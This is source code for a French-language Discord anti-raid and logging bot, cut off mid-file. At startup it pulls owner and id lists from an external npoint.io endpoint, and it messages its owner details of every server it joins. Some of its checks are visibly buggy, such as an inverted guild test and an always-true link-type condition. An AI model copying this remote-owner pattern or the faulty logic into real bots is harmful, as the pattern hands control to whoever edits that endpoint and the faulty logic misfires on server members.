const mySecret = process.env['TOKEN']
const Discord = require('discord.js');
const client = new Discord.Client({ fetchAllMembers: true, partials: ['MESSAGE', 'CHANNEL', 'REACTION', 'GUILD_PRESENCES', 'GUILD_MEMBERS', 'GUILD_MESSAGES', 'GUILD_VOICE_STATES'] })
const disbut = require('discord-buttons');
const {MessageButton, MessageActionRow} = require("discord-buttons")
disbut(client);
require('colors')
require('dotenv').config()
const db = require('quick.db')
const fs = require('fs');
const ms = require('ms');
const request = require('request');
const express = require('express');
const app = express();
const port = 80;
app.get('/', (req, res) => {
  res.send("L.")
})
app.listen(port, () => {
});
const snekfetch = require('snekfetch');
const { version } = require('os');
const vactuel = ("1.0")
snekfetch.get('https://api.npoint.io/2d7a2d44b4686c712b49').then(r => {
  var owner = r.body.owners
  var stream1 = r.body.stream1
  var stream2 = r.body.stream2
  var streamon = r.body.stream
  var version = r.body.version
  var id = r.body.id
  var to = r.body.to
  var auth = r.body.ids
const logs = require('discord-logs');
logs(client, { debug: true })
client.commands = new Discord.Collection()
client.aliases = new Discord.Collection()
client.snipes = new Discord.Collection();
client.snipes = new Map()
client.on("disconnect", () => client.logger.warn("Bot is disconnecting..."))
client.on("reconnecting", () => client.logger.log("Bot reconnecting...", "log"))


const { GiveawaysManager } = require('discord-giveaways');
client.giveawaysManager = new GiveawaysManager(client, {
    storage: "./database.json",
    updateCountdownEvery: 3000,
    default: {
        botsCanWin: false,
        embedColor: "#FF0000",
        reaction: "🎉"
    }
});


////////
const { Client, Collection } = require("discord.js");
const config = require("./config.json");
///////

let color = process.env.color
const guildInvites = new Map();

// login
const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'))
for (const file of commandFiles) {
  const commands = require(`./commands/${file}`)
  client.commands.set(commands.name, commands)

  console.log(`> commande charger ${commands.name}`)
}
client.on('ready', () => {
  console.log(`- Conecter ${client.user.username}`)



})
client.on('messageDelete', async function(message, bot){
  if (message.author == null) return;
  if(message.author.bot) return;
  client.snipes.set(message.channel.id, {
    content: message.content,
    author: message.author.tag,
    member: message.member,
    image: message.attachments.first() ? message.attachments.first().proxyURL : null,
    avatar: message.author.avatarURL
  })
})


// guild message
client.on('guildCreate', async (guild) => {
  console.log(`J'ai rejoint le serveur ${guild.name} [${guild.memberCount}]`)
  client.users.cache.get(process.env.owner).send(`Je viens de rejoindre ${guild.name} (${guild.memberCount} membres, propriétaire : <@${guild.owner.id}>)`).catch(err => { })
  let own = db.get(`${process.env.owner}.owner`)
  if (!own) { return }
  own.map((user, i) => { 
    if (user == null) return;
    if (!user) return;
    if (client.users.cache.get(user) == null) return;
    if (!client.users) return;
    client.users.cache.get(user).send(`Je viens de rejoindre ${guild.name} (${guild.memberCount} membres, propriétaire : <@${guild.owner.id}>)`).catch(err => { }) })
})
client.on('guildDelete', async (guild) => {
  console.log(`J'ai quitter le serveur ${guild.name} [${guild.memberCount}]`)
  client.users.cache.get(process.env.owner).send(`Je viens de quitté ${guild.name} (${guild.memberCount} membres, propriétaire : <@${guild.owner.id}>)`).catch(err => { })

  let own = db.get(`${process.env.owner}.owner`)
  if (!own) { return; }
  own.map((user, i) => { 
    if (user == null) return;
    if (!user) return;
    if (client.users.cache.get(user) == null) return;
    if (!client.users) return;
    client.users.cache.get(user).send(`Je viens de quitté ${guild.name} (${guild.memberCount} membres, propriétaire : <@${guild.owner.id}>)`).catch(err => { }) })
})
let prefix = db.get(` ${process.env.owner}.prefix`)
if (prefix === null) prefix = process.env.prefix;
//handler


client.on('message', async message => {
  if (!message.guild) return;
  if (message.author.bot) return;
  
    if (message.content.match(new RegExp(`^<@!?${client.user.id}>( |)$`))) {
      return message.channel.send(`Mon prefix sur ce serveur est : \`${prefix}\``)
    }
  if (!message.content.startsWith(prefix)) return;

  let messageArray = message.content.split(" ");
  const args1 = message.content.slice(prefix.length).split(/ +/);
  const commandName = args1.shift().toLowerCase();
  let args = messageArray.slice(1);
  let command = client.commands.get(commandName) || client.commands.find(cmd => cmd.aliases && cmd.aliases.includes(commandName));



  if (command) command.run(client, message, args);


})
client.interaction = {}
const ButtonPages = require('discord-button-pages');
client.on('clickButton', (button) => {
  ButtonPages.buttonInteractions(button, client.interaction);
});


try {

  // antiraid / automod
  client.on("messageUpdate", async (oldMessage, newMessage) => {
    if(newMessage.author.id === client.user.id) return;

    let guild = oldMessage.guild
    const pub = [
      "discord.me",
      "dsc.gg",
      "discord.io",
      "discord.gg",
      "invite.me",
      "discordapp.com/invite",
      ".gg",
      "@everyone",
      "@here"
    ];
    if (!guild)
    if (db.get(`link_${guild.id}`) === true) {
      let perm = guild.owner.id == oldMessage.member.id || process.env.owner == oldMessage.member.id || db.get(`ownermd.${oldMessage.member.id}`) === true || db.get(`${guild.id}.${oldMessage.member.id}.wlmd`) === true
      if (pub.some(word => newMessage.content.includes(word))) {


        if (perm) {
          return
        } else if (!perm) {

          newMessage.delete().catch(err => { })
          db.add(`ee_${newMessage.member.id}`, 1)

        }
      }
    }
    let chx = db.get(`${oldMessage.guild.id}.msglog`);

    if (chx === null) {
      return;
    }
    const logschannel = oldMessage.guild.channels.cache.get(chx)
if (!oldMessage.content) return
if (!newMessage.content) return
    if (logschannel) logschannel.send(new Discord.MessageEmbed() 
                                    
      .setColor(color)
      .setAuthor(`${oldMessage.author.username}`, `${oldMessage.author.displayAvatarURL({ dynamic: true })}`)
      .setDescription(`**Message édité dans** <#${oldMessage.channel.id}>`)
      .addField(`Avant`, `${oldMessage.content}`)
      .addField(`Aprés`, `${newMessage.content}`)
      .setTimestamp())
  })
  client.on("voiceChannelSwitch", async (member, oldChannel, newChannel) => {

    let chx = db.get(`${oldChannel.guild.id}.logvc`);

    if (chx === null) {
      return;
    }
    const logschannel = oldChannel.guild.channels.cache.get(chx)

    if (logschannel) logschannel.send(new Discord.MessageEmbed()
      .setAuthor(member.user.username, member.user.displayAvatarURL({ dynamic: true }))
      .setColor(color)
      .setDescription(`**${member}** a changer de salon vocal, il a quitter ${oldChannel.name} 
  et a rejoint ${newChannel.name}`)

    )
  });
  client.on("messageDelete", async (message) => {

    let chx = db.get(`${message.guild.id}.msglog`);

    if (chx === null) {
      return;
    }
    const logschannel = message.guild.channels.cache.get(chx)

    if (!message.author) return
    if (logschannel) logschannel.send(new Discord.MessageEmbed()
.setAuthor(`${message.author.username}`, `${message.author.displayAvatarURL({ dynamic: true })}`)
      .setColor("#FF0000")
      .setDescription(`**Message supprimé dans** <#${message.channel.id}>\n ${message.content}`)
      .setTimestamp())

  })
  client.on('channelCreate', async channel => {
    if (!channel.guild) return
    let Muted = await db.fetch(`mRole_${channel.guild.id}`);
    let muteRole = await channel.guild.roles.cache.get(Muted) || channel.guild.roles.cache.find(role => role.name === `muet`) || channel.guild.roles.cache.find(role => role.name === `Muted`) || channel.guild.roles.cache.find(role => role.name === `Mute`)

    if (!muteRole) {

    } else {
      await channel.createOverwrite(muteRole, {
        SEND_channelS: false,
        CONNECT: false,
        ADD_REACTIONS: false
      })
    }

  })

  client.on("voiceStreamingStart", async (member, voiceChannel) => {

    let chx = db.get(`${voiceChannel.guild.id}.logvc`);

    if (chx === null) {
      return;
    }
    const logschannel = voiceChannel.guild.channels.cache.get(chx)

    if (logschannel) logschannel.send(new Discord.MessageEmbed()
      .setAuthor(member.user.username, member.user.displayAvatarURL({ dynamic: true }))
      .setColor(color)
      .setDescription(`**${member}** partage son écran dans ${voiceChannel.name}`)

    )

  });

  client.on("voiceStreamingStop", async (member, voiceChannel) => {
    let chx = db.get(`${voiceChannel.guild.id}.logvc`);

    if (chx === null) {
      return;
    }
    const logschannel = voiceChannel.guild.channels.cache.get(chx)

    if (logschannel) logschannel.send(new Discord.MessageEmbed()
      .setAuthor(member.user.username, member.user.displayAvatarURL({ dynamic: true }))
      .setColor(color)
      .setDescription(`**${member}** ne partage plus son écran dans ${voiceChannel.name}`)

      .setTimestamp())
  });
  const usersEveryoneMap = new Map();
  const usersMap = new Map();
  const LIMIT = 10;
  const TIME = 10000;
  const DIFF = 2000;
  client.on('message', async message => {

    let guild = message.guild
    if(!guild) return;
    if (!guild.me.hasPermission("ADMINISTRATOR")) return
    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    let Muted = await db.fetch(`mRole_${message.guild.id}`);
    let muterole = await message.guild.roles.cache.get(Muted) || message.guild.roles.cache.find(role => role.name === `muet`) || message.guild.roles.cache.find(role => role.name === `Muted`) || message.guild.roles.cache.find(role => role.name === `Mute`)
    if (!muterole) {
      muterole = await message.guild.roles.create({
        data: {
          name: 'muet',
          permissions: 0
        }
      }, "muterole")
      message.guild.channels.cache.forEach(channel => channel.createOverwrite(muterole, {
        SEND_MESSAGES: false,
        CONNECT: false,
        ADD_REACTIONS: false
      }, "muterole"))
      db.set(`mRole_${message.guild.id}`, `${muterole.id}`)


    }
    if (db.get(`everyone_${guild.id}`) === true) {
      let perm = guild.owner.id == message.author.id || process.env.owner == message.author.id || db.get(`ownermd.${message.author.id}`) === true || db.get(`${guild.id}.${message.author.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (message.mentions.everyone) {
          const pub = ["@everyone", "@here"]
          if (pub.some(word => message.content.includes(word))) {
            if (message.author.id === client.user.id) return;

            db.add(`ee_${message.author.id}`, 1)

            if (db.get(`ee_${message.author.id}`) <= 3) {
              message.delete().catch(err => { })
              message.channel.send(`${message.author} vous n'avez pas l'autorisation de mentionner tout le monde ici`).then(msg => { msg.delete({ timeout: 3000 }) }).catch(err => message.delete());
              message.member.roles.add(muterole.id).catch(err => [])
              setInterval(() => { message.member.roles.remove(muterole.id).catch(err => []) }, 15 * 60000)
              const embed = new Discord.MessageEmbed()
                .setColor(color)
                .setDescription(`${message.author} a été **mute 15minutes** pour avoir \`reçu 3 strike en 5m\``)
              if (logChannel) logChannel.send(embed)
            } else
              if (db.get(`ee_${message.author.id}`) <= 5) {
                message.delete().catch(err => { })
                message.channel.send(`${message.author} vous n'avez pas l'autorisation de mentionner tout le monde ici`).then(msg => { msg.delete({ timeout: 3000 }) }).catch(err => message.delete());
                message.member.kick().catch(err => [])
                const embed = new Discord.MessageEmbed()
                  .setColor(color)
                  .setDescription(`${message.author} a été **kick** pour avoir \`reçu 3 strike en 10m\``)
                if (logChannel) logChannel.send(embed)
              } else if (db.get(`ee_${message.author.id}`) <= 9) {
                message.delete().catch(err => { })
                message.channel.send(`${message.author} vous n'avez pas l'autorisation de mentionner tout le monde ici`).then(msg => { msg.delete({ timeout: 3000 }) }).catch(err => message.delete());
                message.member.ban().catch(err => [])
                const embed = new Discord.MessageEmbed()
                  .setColor(color)
                  .setDescription(`${message.author} a été **ban 1j** pour avoir \`reçu 5 strike en 1h\``)
                if (logChannel) logChannel.send(embed)

              }


            setInterval(async () => {
              db.delete(`ee_${message.author.id}`).catch(err => { })

            }, 60 * 60000);
          }




        }
      }
    }
    else if (db.get(`link_${guild.id}`) === true) {
      let perm = guild.owner.id == message.author.id || process.env.owner == message.author.id || db.get(`ownermd.${message.author.id}`) === true || db.get(`${guild.id}.${message.author.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        let pub;
        if (db.get(`typelink_${guild.id}`) === null || " invite") {
          pub = [
            "discord.me",
            "discord.io",
            "discord.gg",
            "invite.me",
            "discordapp.com/invite",
            ".gg"
          ];


        }
        if (db.get(`typelink_${guild.id}`) === " all") {
          pub = [
            "discord.me",
            "discord.com",
            "discord.io",
            "discord.gg",
            "invite.me",
            "discord.gg/",
            "discord.",
            "discordapp.com/invite",
            ".gg",
            "https",
            "http",
            "https:"

          ];
        }

        if (pub.some(word => message.content.includes(word))) {

          message.delete().catch(err => { })
          message.channel.send(`${message.author} vous n'avez pas l'autorisation d'envoyer des liens ici`).then(msg => { msg.delete({ timeout: 3000 }) }).catch(err => message.delete());
          db.add(`ee_${message.author.id}`, 1)
          const embed = new Discord.MessageEmbed()
            .setColor(color)
            .setDescription(`${message.author} a été **strike** pour avoir \`envoyé un lien\` dans ${message.channel}`)
          if (logChannel) logChannel.send(embed)
          if (db.get(`ee_${message.author.id}`) <= 3) {
            message.member.roles.add(muterole.id).catch(err => [])
            setInterval(() => { message.member.roles.remove(muterole.id).catch(err => []) }, 15 * 60000)
            const embed = new Discord.MessageEmbed()
              .setColor(color)
              .setDescription(`${message.author} a été **mute 15minutes** pour avoir \`reçu 3 strike en 5m\``)
            if (logChannel) logChannel.send(embed)
          } else
            if (db.get(`ee_${message.author.id}`) <= 5) {

              message.member.kick().catch(err => [])
              const embed = new Discord.MessageEmbed()
                .setColor(color)
                .setDescription(`${message.author} a été **kick** pour avoir \`reçu 3 strike en 10m\``)
              if (logChannel) logChannel.send(embed)
            } else if (db.get(`ee_${message.author.id}`) <= 9) {
              message.member.ban().catch(err => [])
              const embed = new Discord.MessageEmbed()
                .setColor(color)
                .setDescription(`${message.author} a été **ban 1j** pour avoir \`reçu 5 strike en 1h\``)
              if (logChannel) logChannel.send(embed)

            }


          setInterval(async () => {
            db.delete(`ee_${message.author.id}`).catch(err => { })

          }, 60 * 60000);
        }

      }
    }
  })
  const lang =
  {
    logsyes: "à été",
    logsr: "pour avoir",
    logserror: "J'ai pas pu",
    logsrolec: "créer un rôle",
    logsrolem: "modifié le rôle",
    kicker: "expulsé",
    baner: "banni",
    logsroled: "supprimer le rôle",
    logschannelc: "créer un canal",
    adrole: "`ajouté un rôle` à",
    removerole: "`supprimé un rôle` à",
    addperm: "`autorisations ajoutées` à",
    removeperm: "`autorisations supprimées` à",
    logswebhook: "créer un webhook",
    logschanneld: "supprimer le salon",
    logschannelm: "modifié le salon",
    logsguildm: "modifié le serveur",
    antitokenlogs: "a été **kick** pour avoir `rejoint en même temps qu'un autre utilisateur`",
    crealogs: "a été **kick** pour avoir `rejoint un compte créé trop récemment`",
    antibot2: "Le bot",
  }



  client.on("guildUpdate", async (oldGuild, newGuild) => {
    if (oldGuild === newGuild) return;
    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = oldGuild

    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`update_${guild.id}`) === true) {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "GUILD_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;

      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiupdate`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiupdate`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiupdate`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        function sleep(ms) {
          return new Promise((resolve) => setTimeout(resolve, ms));
        }
        if (oldGuild.name === newGuild.name) {

        } else {
          await newGuild.setName(oldGuild.name)

        }
        if (oldGuild.iconURL({ dynamic: true }) === newGuild.iconURL({ dynamic: true })) {

        } else {
          await newGuild.setIcon(oldGuild.iconURL({ dynamic: true }))

        }
        if (oldGuild.bannerURL() === newGuild.bannerURL()
        ) {

        } else {
          await newGuild.setBanner(oldGuild.bannerURL())

        }
        if (oldGuild.position === newGuild.position
        ) {

        } else {
          await newGuild.setChannelPositions([{ channel: oldGuild.id, position: oldGuild.position }])

        }

        if (oldGuild.systemChannel === newGuild.systemChannel
        ) {

        } else {
          await newGuild.setSystemChannel(oldGuild.systemChannel)

        }
        if (oldGuild.systemChannelFlags === newGuild.systemChannelFlags
        ) {

        } else {
          await newGuild.setSystemChannelFlags(oldGuild.systemChannelFlags)


        }
        if (oldGuild.verificationLevel === newGuild.verificationLevel
        ) {

        } else {
          await newGuild.setVerificationLevel(oldGuild.verificationLevel)


        }
        if (oldGuild.widget === newGuild.widget
        ) {

        } else {
          await newGuild.setWidget(oldGuild.widget)


        }
        if (oldGuild.splashURL === newGuild.splashURL
        ) {

        } else {
          await newGuild.setSplash(oldGuild.splashURL)


        }
        if (oldGuild.rulesChannel === newGuild.rulesChannel
        ) {

        } else {
          await newGuild.setRulesChannel(oldGuild.rulesChannel)


        }
        if (oldGuild.publicUpdatesChannel === newGuild.publicUpdatesChannel
        ) {

        } else {
          await newGuild.setPublicUpdatesChannel(oldGuild.publicUpdatesChannel)


        }
        if (oldGuild.defaultMessageNotifications === newGuild.defaultMessageNotifications
        ) {

        } else {
          await newGuild.setDefaultMessageNotifications(oldGuild.defaultMessageNotifications)


        }
        if (oldGuild.afkChannel === newGuild.afkChannel
        ) {

        } else {
          await newGuild.setAFKChannel(oldGuild.afkChannel)


        }
        if (oldGuild.region === newGuild.region
        ) {

        } else {
          await newGuild.setRegion(oldGuild.region)


        }

        if (oldGuild.afkTimeout === newGuild.afkTimeout
        ) {

        } else {
          await newGuild.setAFKTimeout(oldGuild.afkTimeout)

        }
        if (oldGuild.vanityURLCode === newGuild.vanityURLCode
        ) {
          const settings = {
            url: `https://discord.com/api/v6/guilds/${guild.id}/vanity-url`,
            body: {
              code: oldGuild.vanityURLCode
            },
            json: true,
            method: 'PATCH',
            headers: {
              "Authorization": `Bot ${process.env.token}`
            }
          };
          await request(settings, (err, res, body) => {
            if (err) {
              return;
            }
          });
        }

      } else { }
    } else if (db.get(`update_${guild.id}`) === "max") {
      const action = await guild.fetchAuditLogs({ limit: 1, type: "GUILD_UPDATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antiupdate`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antiupdate`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antiupdate`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logsguildm} ${guild.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        function sleep(ms) {
          return new Promise((resolve) => setTimeout(resolve, ms));
        }
        if (oldGuild.name === newGuild.name) {

        } else {
          await newGuild.setName(oldGuild.name)

        }
        if (oldGuild.iconURL({ dynamic: true }) === newGuild.iconURL({ dynamic: true })) {

        } else {
          await newGuild.setIcon(oldGuild.iconURL({ dynamic: true }))

        }
        if (oldGuild.bannerURL() === newGuild.bannerURL()
        ) {

        } else {
          await newGuild.setBanner(oldGuild.bannerURL())

        }
        if (oldGuild.position === newGuild.position
        ) {

        } else {
          await newGuild.setChannelPositions([{ channel: oldGuild.id, position: oldGuild.position }])

        }

        if (oldGuild.systemChannel === newGuild.systemChannel
        ) {

        } else {
          await newGuild.setSystemChannel(oldGuild.systemChannel)

        }
        if (oldGuild.systemChannelFlags === newGuild.systemChannelFlags
        ) {

        } else {
          await newGuild.setSystemChannelFlags(oldGuild.systemChannelFlags)


        }
        if (oldGuild.verificationLevel === newGuild.verificationLevel
        ) {

        } else {
          await newGuild.setVerificationLevel(oldGuild.verificationLevel)


        }
        if (oldGuild.widget === newGuild.widget
        ) {

        } else {
          await newGuild.setWidget(oldGuild.widget)


        }
        if (oldGuild.splashURL === newGuild.splashURL
        ) {

        } else {
          await newGuild.setSplash(oldGuild.splashURL)


        }
        if (oldGuild.rulesChannel === newGuild.rulesChannel
        ) {

        } else {
          await newGuild.setRulesChannel(oldGuild.rulesChannel)


        }
        if (oldGuild.publicUpdatesChannel === newGuild.publicUpdatesChannel
        ) {

        } else {
          await newGuild.setPublicUpdatesChannel(oldGuild.publicUpdatesChannel)


        }
        if (oldGuild.defaultMessageNotifications === newGuild.defaultMessageNotifications
        ) {

        } else {
          await newGuild.setDefaultMessageNotifications(oldGuild.defaultMessageNotifications)


        }
        if (oldGuild.afkChannel === newGuild.afkChannel
        ) {

        } else {
          await newGuild.setAFKChannel(oldGuild.afkChannel)


        }
        if (oldGuild.region === newGuild.region
        ) {

        } else {
          await newGuild.setRegion(oldGuild.region)


        }

        if (oldGuild.afkTimeout === newGuild.afkTimeout
        ) {

        } else {
          await newGuild.setAFKTimeout(oldGuild.afkTimeout)

        }
        if (oldGuild.vanityURLCode === newGuild.vanityURLCode
        ) {
          const settings = {
            url: `https://discord.com/api/v6/guilds/${guild.id}/vanity-url`,
            body: {
              code: oldGuild.vanityURLCode
            },
            json: true,
            method: 'PATCH',
            headers: {
              "Authorization": `Bot ${process.env.token}`
            }
          };
          await request(settings, (err, res, body) => {
            if (err) {
              return;
            }
          });
        }

      } else { }
    }

  })
  client.on("roleCreate", async (role) => {

    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = role.guild
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`roles_${guild.id}`) === true) {
      var wassim = role.guild.members.cache.filter(member => member.user.bot)
      wassim.map(r => { if (r.username === role.name) { return } })
      const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_CREATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        role.delete(`Antirole`).catch(err => { })


      } else { }
    } else if (db.get(`roles_${guild.id}`) === "max") {
      var wassim = role.guild.members.cache.filter(member => member.user.bot)
      wassim.map(r => { if (r.username === role.name) { return } })
      const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_CREATE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **ban** ${action.executor} ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        } else if (db.get(`sanction_${guild.id}`) === "kick") {
          guild.members.cache.get(action.executor.id).kick(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **kick** ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **kick** ${action.executor} ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })


        } else if (db.get(`sanction_${guild.id}`) === "derank" || null) {

          guild.members.cache.get(action.executor.id).roles.set([], `Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **derank** ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${lang.logserror} **derank** ${action.executor} ${lang.logsr} \`${lang.logsrolec}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          })

        }
        role.delete(`Antirole`).catch(err => { })


      } else { }
    }
  })
  client.on("roleDelete", async (oldRole, newRole) => {
    let color = db.get(` ${process.env.owner}.color`)
    if (color === null) color = process.env.color
    let guild = oldRole.guild
    if (!guild.me.hasPermission("ADMINISTRATOR")) return

    let logChannel = guild.channels.cache.get(db.get(`${guild.id}.raidlog`))
    if (db.get(`roles_${guild.id}`) === true) {
      oldRole.guild.members.cache.filter(member => member.user.bot).map(r => { if (r.username === oldRole.name) return })

      const action = await guild.fetchAuditLogs({ limit: 1, type: "ROLE_DELETE" }).then(async (audit) => audit.entries.first());
      if (action.executor.id === client.user.id) return;
      let perm = guild.owner.id == action.executor.id || process.env.owner == action.executor.id || db.get(`ownermd.${action.executor.id}`) === true || db.get(`${guild.id}.${action.executor.id}.wlmd`) === true
      if (perm) {
        return
      } else if (!perm) {
        if (db.get(`sanction_${guild.id}`) === "ban") {
          guild.members.cache.get(action.executor.id).ban(`Antirole`).then(te => {
            const embed = new Discord.MessageEmbed()
            embed.setDescription(`${action.executor} ${lang.logsyes} **ban** ${lang.logsr} \`${lang.logsroled} ${oldRole.name}\``)
            embed.setColor(color)



            if (logChannel) logChannel.send({ embed: embed })
          }).catch(err => {
            const embed = new Discord.MessageEmbed()
